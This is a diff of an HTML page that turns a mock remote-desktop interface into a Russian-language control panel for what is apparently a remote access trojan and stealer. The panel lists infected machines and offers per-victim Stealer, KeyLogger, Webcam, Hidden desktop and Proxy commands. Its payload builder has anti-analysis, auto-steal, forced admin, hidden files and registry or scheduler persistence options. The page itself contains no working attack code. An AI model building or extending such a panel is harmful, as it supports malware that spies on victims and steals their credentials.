@@ -3,579 +3,179 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Remote Access Tool</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #0d1b2a, #1b263b);
-            color: #e0e1dd;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        
-        header {
-            text-align: center;
-            margin-bottom: 30px;
-            padding: 20px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-        }
-        
-        h1 {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-            color: #778da9;
-        }
-        
-        .status {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 15px 0;
-        }
-        
-        .status-indicator {
-            width: 15px;
-            height: 15px;
-            border-radius: 50%;
-            margin-right: 10px;
-        }
-        
-        .connected {
-            background-color: #4caf50;
-        }
-        
-        .disconnected {
-            background-color: #f44336;
-        }
-        
-        .connecting {
-            background-color: #ff9800;
-            animation: pulse 1.5s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-        
-        .main-content {
-            display: grid;
-            grid-template-columns: 300px 1fr;
-            gap: 20px;
-        }
-        
-        .sidebar {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 20px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-        }
-        
-        .panel {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 20px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-            margin-bottom: 20px;
-        }
-        
-        h2 {
-            font-size: 1.5rem;
-            margin-bottom: 15px;
-            color: #778da9;
-        }
-        
-        .button-grid {
-            display: grid;
-            gap: 10px;
-        }
-        
-        .btn {
-            padding: 12px 15px;
-            border: none;
-            border-radius: 8px;
-            background: linear-gradient(135deg, #415a77, #778da9);
-            color: #fff;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-        }
-        
-        .btn:active {
-            transform: translateY(0);
-        }
-        
-        .btn-danger {
-            background: linear-gradient(135deg, #f44336, #d32f2f);
-        }
-        
-        .btn-warning {
-            background: linear-gradient(135deg, #ff9800, #f57c00);
-        }
-        
-        .btn-success {
-            background: linear-gradient(135deg, #4caf50, #388e3c);
-        }
-        
-        .connection-panel {
-            display: flex;
-            gap: 10px;
-            margin-top: 15px;
-        }
-        
-        input, select {
-            flex: 1;
-            padding: 12px;
-            border: none;
-            border-radius: 8px;
-            background: rgba(255, 255, 255, 0.1);
-            color: #fff;
-        }
-        
-        .desktop-view {
-            background: #000;
-            border-radius: 10px;
-            height: 400px;
-            position: relative;
-            overflow: hidden;
-            margin-bottom: 20px;
-        }
-        
-        .desktop-screen {
-            width: 100%;
-            height: 100%;
-            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiMwMDAwMDAiPjwvcmVjdD48dGV4dCB4PSI0MCUiIHk9IjUwJSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjI0IiBmaWxsPSIjNDE1QTc3Ij5SZW1vdGUgRGVza3RvcCBTY3JlZW48L3RleHQ+PC9zdmc+') no-repeat center;
-            background-size: cover;
-        }
-        
-        .desktop-controls {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-        
-        .files-view {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-            height: 200px;
-            overflow-y: auto;
-        }
-        
-        .file-item {
-            display: flex;
-            align-items: center;
-            padding: 8px;
-            margin-bottom: 5px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        
-        .file-item:hover {
-            background: rgba(255, 255, 255, 0.1);
-        }
-        
-        .file-icon {
-            margin-right: 10px;
-            width: 24px;
-            height: 24px;
-            background: #415a77;
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .output {
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 8px;
-            height: 150px;
-            overflow-y: auto;
-            font-family: monospace;
-            font-size: 14px;
-        }
-        
-        .log-entry {
-            margin-bottom: 8px;
-            padding: 8px;
-            border-left: 3px solid #778da9;
-            background: rgba(255, 255, 255, 0.05);
-        }
-        
-        .tab-container {
-            display: flex;
-            gap: 5px;
-            margin-bottom: 15px;
-        }
-        
-        .tab {
-            padding: 10px 15px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 5px 5px 0 0;
-            cursor: pointer;
-        }
-        
-        .tab.active {
-            background: rgba(255, 255, 255, 0.2);
-        }
-        
-        .tab-content {
-            display: none;
-        }
-        
-        .tab-content.active {
-            display: block;
-        }
-        
-        .device-list {
-            margin-top: 15px;
-        }
-        
-        .device-item {
-            display: flex;
-            align-items: center;
-            padding: 10px;
-            margin-bottom: 10px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 8px;
-            cursor: pointer;
-        }
-        
-        .device-item:hover {
-            background: rgba(255, 255, 255, 0.1);
-        }
-        
-        .device-icon {
-            width: 40px;
-            height: 40px;
-            background: #415a77;
-            border-radius: 50%;
-            margin-right: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        @media (max-width: 768px) {
-            .main-content {
-                grid-template-columns: 1fr;
-            }
-        }
-    </style>
+    <title>Панель управления</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
+
     <div class="container">
-        <header>
-            <h1>Remote Access Tool</h1>
-            <div class="status">
-                <div class="status-indicator disconnected" id="status-indicator"></div>
-                <span id="status-text">Не подключено</span>
-            </div>
-        </header>
-        
-        <div class="main-content">
-            <div class="sidebar">
-                <div class="panel">
-                    <h2>Подключение</h2>
-                    <div class="connection-panel">
-                        <input type="text" id="remote-ip" placeholder="IP адрес или ID">
-                        <button class="btn btn-success" id="connect-btn">Подключиться</button>
-                    </div>
-                    
-                    <div class="connection-panel">
-                        <select id="connection-type">
-                            <option value="rdp">RDP</option>
-                            <option value="vnc">VNC</option>
-                            <option value="ssh">SSH</option>
-                            <option value="custom">Custom</option>
-                        </select>
-                    </div>
-                    
-                    <div class="device-list" id="device-list">
-                        <h3>История подключений</h3>
-                        <div class="device-item">
-                            <div class="device-icon">PC</div>
-                            <div>192.168.1.105 (Windows)</div>
-                        </div>
-                        <div class="device-item">
-                            <div class="device-icon">SRV</div>
-                            <div>server.company.com (Linux)</div>
-                        </div>
-                        <div class="device-item">
-                            <div class="device-icon">NB</div>
-                            <div>macbook-user (macOS)</div>
-                        </div>
-                    </div>
+        <!-- Главная навигация слева -->
+        <nav class="main-nav">
+            <a href="#" id="main-menu-btn" class="nav-button active" title="Главный экран"><i class="fas fa-home"></i></a>
+            <a href="#" id="builder-btn" class="nav-button" title="Билдер"><i class="fas fa-hammer"></i></a>
+        </nav>
+
+        <!-- Основной контент -->
+        <main class="content">
+
+            <!-- Экран 1: Главный экран с пользователями -->
+            <div id="main-screen" class="screen active">
+                <div class="header">
+                    <h2>Пользователи онлайн</h2>
                 </div>
-                
-                <div class="panel">
-                    <h2>Быстрые действия</h2>
-                    <div class="button-grid">
-                        <button class="btn" id="mic-btn">
-                            <i class="fas fa-microphone"></i> Микрофон
-                        </button>
-                        <button class="btn" id="cam-btn">
-                            <i class="fas fa-video"></i> Камера
-                        </button>
-                        <button class="btn" id="files-btn">
-                            <i class="fas fa-folder"></i> Файлы
-                        </button>
-                        <button class="btn" id="process-btn">
-                            <i class="fas fa-tasks"></i> Процессы
-                        </button>
-                        <button class="btn" id="cmd-btn">
-                            <i class="fas fa-terminal"></i> Командная строка
-                        </button>
-                        <button class="btn btn-warning" id="scan-btn">
-                            <i class="fas fa-radar"></i> Сканировать сеть
-                        </button>
+                <div class="user-list">
+                    <!-- Пользователей будем добавлять через JS, но вот пример -->
+                    <div class="user-item" data-id="user1">
+                        <span><i class="fas fa-desktop"></i> DESKTOP-ABC123</span>
+                        <span>192.168.1.10</span>
+                        <span>Windows 10</span>
+                        <span>USA</span>
+                        <span>Online</span>
+                    </div>
+                    <div class="user-item" data-id="user2">
+                        <span><i class="fas fa-laptop"></i> LAPTOP-XYZ789</span>
+                        <span>10.0.0.5</span>
+                        <span>Windows 11</span>
+                        <span>Germany</span>
+                        <span>Online</span>
+                    </div>
+                    <div class="user-item" data-id="user3">
+                        <span><i class="fas fa-server"></i> SERVER-MAIN</span>
+                        <span>8.8.8.8</span>
+                        <span>Windows Server</span>
+                        <span>USA</span>
+                        <span class="offline">Offline</span>
                     </div>
                 </div>
             </div>
-            
-            <div class="panel" style="grid-column: span 1;">
-                <div class="tab-container">
-                    <div class="tab active" data-tab="desktop">Рабочий стол</div>
-                    <div class="tab" data-tab="files">Файловый менеджер</div>
-                    <div class="tab" data-tab="terminal">Терминал</div>
-                    <div class="tab" data-tab="tools">Инструменты</div>
-                </div>
-                
-                <div class="tab-content active" id="desktop-tab">
-                    <div class="desktop-controls">
-                        <button class="btn" id="view-btn">
-                            <i class="fas fa-desktop"></i> Просмотр
-                        </button>
-                        <button class="btn" id="control-btn">
-                            <i class="fas fa-mouse"></i> Управление
-                        </button>
-                        <button class="btn" id="quality-btn">
-                            <i class="fas fa-tachometer-alt"></i> Качество
-                        </button>
-                        <button class="btn btn-danger" id="disconnect-btn">
-                            <i class="fas fa-power-off"></i> Отключиться
-                        </button>
+
+            <!-- Экран 2: Экран подключенного пользователя -->
+            <div id="connected-screen" class="screen">
+                <div class="connected-layout">
+                    <!-- Левая панель с командами -->
+                    <div class="command-panel">
+                        <button class="command-btn"><i class="fas fa-info-circle"></i> Information</button>
+                        <button class="command-btn"><i class="fas fa-power-off"></i> Remote start</button>
+                        <button class="command-btn"><i class="fas fa-globe"></i> Proxy</button>
+                        <button class="command-btn"><i class="fas fa-cookie-bite"></i> Stealer</button>
+                        <button class="command-btn"><i class="fas fa-clipboard"></i> Clipboard</button>
+                        <button class="command-btn"><i class="fas fa-scroll"></i> Roll</button>
+                        <button class="command-btn"><i class="fas fa-code"></i> Code & Scripts</button>
+                        <button class="command-btn"><i class="fas fa-comments"></i> Communication</button>
+                        <button class="command-btn"><i class="fas fa-tasks"></i> Task manager</button>
+                        <button class="command-btn"><i class="fas fa-folder-open"></i> File manager</button>
+                        <button class="command-btn"><i class="fas fa-terminal"></i> Terminal</button>
+                        <button class="command-btn"><i class="fas fa-keyboard"></i> KeyLogger</button>
+                        <button class="command-btn"><i class="fas fa-video"></i> Webcam</button>
+                        <button class="command-btn active"><i class="fas fa-desktop"></i> Remote desktop</button>
+                        <button class="command-btn"><i class="fas fa-eye-slash"></i> Hidden desktop</button>
+                        <div class="spacer"></div>
+                        <button class="command-btn"><i class="fas fa-cog"></i> Settings</button>
+                        <button id="disconnect-btn" class="command-btn disconnect"><i class="fas fa-sign-out-alt"></i> Выйти</button>
                     </div>
-                    
-                    <div class="desktop-view">
-                        <div class="desktop-screen"></div>
+                    <!-- Центральная область -->
+                    <div class="main-view">
+                        <div class="loading-spinner"></div>
+                        <p class="status-text">Waiting for user...</p>
                     </div>
-                </div>
-                
-                <div class="tab-content" id="files-tab">
-                    <div class="desktop-controls">
-                        <button class="btn" id="upload-btn">
-                            <i class="fas fa-upload"></i> Загрузить
-                        </button>
-                        <button class="btn" id="download-btn">
-                            <i class="fas fa-download"></i> Скачать
-                        </button>
-                        <button class="btn" id="execute-btn">
-                            <i class="fas fa-play"></i> Выполнить
-                        </button>
-                        <button class="btn btn-danger" id="delete-btn">
-                            <i class="fas fa-trash"></i> Удалить
-                        </button>
-                    </div>
-                    
-                    <div class="files-view">
-                        <div class="file-item">
-                            <div class="file-icon"><i class="fas fa-folder"></i></div>
-                            <div>Documents</div>
-                        </div>
-                        <div class="file-item">
-                            <div class="file-icon"><i class="fas fa-folder"></i></div>
-                            <div>Pictures</div>
-                        </div>
-                        <div class="file-item">
-                            <div class="file-icon"><i class="fas fa-file"></i></div>
-                            <div>readme.txt</div>
-                        </div>
-                        <div class="file-item">
-                            <div class="file-icon"><i class="fas fa-file"></i></div>
-                            <div>config.ini</div>
-                        </div>
-                        <div class="file-item">
-                            <div class="file-icon"><i class="fas fa-file"></i></div>
-                            <div>report.pdf</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="tab-content" id="terminal-tab">
-                    <div class="desktop-controls">
-                        <button class="btn" id="cmd-btn">
-                            <i class="fas fa-terminal"></i> Командная строка
-                        </button>
-                        <button class="btn" id="powershell-btn">
-                            <i class="fas fa-terminal"></i> PowerShell
-                        </button>
-                        <button class="btn" id="bash-btn">
-                            <i class="fas fa-terminal"></i> Bash
-                        </button>
-                    </div>
-                    
-                    <div class="output">
-                        <div class="log-entry">Microsoft Windows [Version 10.0.19042.1237]</div>
-                        <div class="log-entry">(c) Microsoft Corporation. All rights reserved.</div>
-                        <div class="log-entry">C:\Users\Admin></div>
-                    </div>
-                    
-                    <div class="connection-panel">
-                        <input type="text" id="command-input" placeholder="Введите команду">
-                        <button class="btn" id="send-command-btn">Выполнить</button>
-                    </div>
-                </div>
-                
-                <div class="tab-content" id="tools-tab">
-                    <h3>Системные инструменты</h3>
-                    <div class="button-grid">
-                        <button class="btn" id="process-view-btn">
-                            <i class="fas fa-tasks"></i> Диспетчер задач
-                        </button>
-                        <button class="btn" id="registry-btn">
-                            <i class="fas fa-database"></i> Реестр
-                        </button>
-                        <button class="btn" id="services-btn">
-                            <i class="fas fa-cogs"></i> Службы
-                        </button>
-                        <button class="btn" id="eventlog-btn">
-                            <i class="fas fa-clipboard-list"></i> Журнал событий
-                        </button>
-                    </div>
-                </div>
-                
-                <div class="output" id="log-output">
-                    <div class="log-entry">Система инициализирована. Готов к подключениям.</div>
                 </div>
             </div>
-        </div>
+
+            <!-- Экран 3: Билдер -->
+            <div id="builder-screen" class="screen">
+                <div class="header">
+                    <h2>Конструктор билда</h2>
+                </div>
+                <div class="builder-form">
+                    <div class="form-column">
+                        <div class="form-group">
+                            <label for="name">name</label>
+                            <input type="text" id="name" value="name">
+                        </div>
+                        <div class="form-group">
+                            <label for="mutex">mutex</label>
+                            <input type="text" id="mutex" value="WEBR_7J6HPJUSL4PR">
+                        </div>
+                        <div class="form-group">
+                            <label for="comment">Comment</label>
+                            <input type="text" id="comment" value="comment">
+                        </div>
+                        <div class="form-group">
+                            <label for="anti-analysis">Anti-analysis</label>
+                            <select id="anti-analysis">
+                                <option>None</option>
+                                <option>Basic</option>
+                                <option>Advanced</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="extension">Extension</label>
+                            <select id="extension">
+                                <option>webbuild.exe</option>
+                                <option>.dll</option>
+                                <option>.scr</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="form-column">
+                        <div class="form-group">
+                            <label for="auto-steal">Auto Steal</label>
+                            <select id="auto-steal">
+                                <option>Once</option>
+                                <option>Always</option>
+                                <option>Never</option>
+                            </select>
+                        </div>
+                         <div class="form-group">
+                            <label for="force-admin">Force admin</label>
+                            <select id="force-admin">
+                                <option>Normal</option>
+                                <option>Aggressive</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="install">Install</label>
+                            <select id="install">
+                                <option>Random</option>
+                                <option>Program Files</option>
+                                <option>AppData</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="copy-count">Copy count</label>
+                            <div class="number-input">
+                                <button>-</button>
+                                <input type="number" id="copy-count" value="2">
+                                <button>+</button>
+                            </div>
+                        </div>
+                         <div class="form-group checkbox-group">
+                            <input type="checkbox" id="hide-files">
+                            <label for="hide-files">Hide files</label>
+                        </div>
+                        <div class="form-group">
+                            <label for="autorun">Autorun</label>
+                            <select id="autorun">
+                                <option>Scheduler</option>
+                                <option>Registry</option>
+                                <option>Startup Folder</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+                 <div class="builder-footer">
+                    <p class="warning">Default settings are recommended.</p>
+                    <div class="builder-buttons">
+                        <button id="create-build-btn">Create</button>
+                        <button>Scripts</button>
+                    </div>
+                </div>
+            </div>
+
+        </main>
     </div>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Elements
-            const statusIndicator = document.getElementById('status-indicator');
-            const statusText = document.getElementById('status-text');
-            const logOutput = document.getElementById('log-output');
-            const connectBtn = document.getElementById('connect-btn');
-            const disconnectBtn = document.getElementById('disconnect-btn');
-            const remoteIp = document.getElementById('remote-ip');
-            const tabs = document.querySelectorAll('.tab');
-            const tabContents = document.querySelectorAll('.tab-content');
-            
-            let isConnected = false;
-            
-            // Add log entry
-            function addLogEntry(message) {
-                const entry = document.createElement('div');
-                entry.className = 'log-entry';
-                entry.textContent = new Date().toLocaleTimeString() + ' - ' + message;
-                logOutput.appendChild(entry);
-                logOutput.scrollTop = logOutput.scrollHeight;
-            }
-            
-            // Update status
-            function updateStatus(status) {
-                isConnected = status === 'connected';
-                statusIndicator.className = 'status-indicator ' + status;
-                
-                if (status === 'connected') {
-                    statusText.textContent = 'Подключено';
-                } else if (status === 'connecting') {
-                    statusText.textContent = 'Подключение...';
-                } else {
-                    statusText.textContent = 'Не подключено';
-                }
-            }
-            
-            // Connect function
-            function connect() {
-                const ip = remoteIp.value.trim();
-                if (!ip) {
-                    addLogEntry('Ошибка: Введите IP адрес или ID');
-                    return;
-                }
-                
-                updateStatus('connecting');
-                addLogEntry('Подключение к ' + ip + '...');
-                
-                // Simulate connection process
-                setTimeout(() => {
-                    updateStatus('connected');
-                    addLogEntry('Подключение установлено к ' + ip);
-                    addLogEntry('Система: Windows 10 Pro (64-bit)');
-                    addLogEntry('Пользователь: Admin');
-                    addLogEntry('Разрешение экрана: 1920x1080');
-                }, 2000);
-            }
-            
-            // Disconnect function
-            function disconnect() {
-                updateStatus('disconnected');
-                addLogEntry('Отключение от удаленного устройства...');
-                
-                setTimeout(() => {
-                    addLogEntry('Отключено');
-                }, 1000);
-            }
-            
-            // Tab switching
-            tabs.forEach(tab => {
-                tab.addEventListener('click', function() {
-                    const tabId = this.getAttribute('data-tab');
-                    
-                    // Deactivate all tabs
-                    tabs.forEach(t => t.classList.remove('active'));
-                    tabContents.forEach(tc => tc.classList.remove('active'));
-                    
-                    // Activate current tab
-                    this.classList.add('active');
-                    document.getElementById(tabId + '-tab').classList.add('active');
-                });
-            });
-            
-            // Event listeners
-            connectBtn.addEventListener('click', connect);
-            disconnectBtn.addEventListener('click', disconnect);
-            
-            // Initialize
-            addLogEntry('Remote Access Tool v1.0.2 инициализирован');
-            addLogEntry('Готов к подключениям');
-            
-            // Simulate initial scan
-            setTimeout(() => {
-                addLogEntry('Сканирование сети: обнаружено 3 устройства');
-            }, 1000);
-        });
-    </script>
-    
-    <!-- Font Awesome for icons -->
-    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+    <script src="script.js"></script>
 </body>
 </html>
